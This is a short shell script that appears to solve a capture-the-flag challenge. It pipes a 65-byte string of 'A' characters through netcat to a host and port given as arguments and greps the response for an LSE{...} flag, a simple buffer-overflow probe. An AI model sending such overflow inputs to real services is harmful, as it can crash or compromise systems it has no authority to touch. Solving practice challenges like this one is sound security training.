#!/bin/sh

echo -n FLAG :
perl -e 'print "A" x 65 . "\n"' | nc $1 $2 | grep -o LSE{.*}
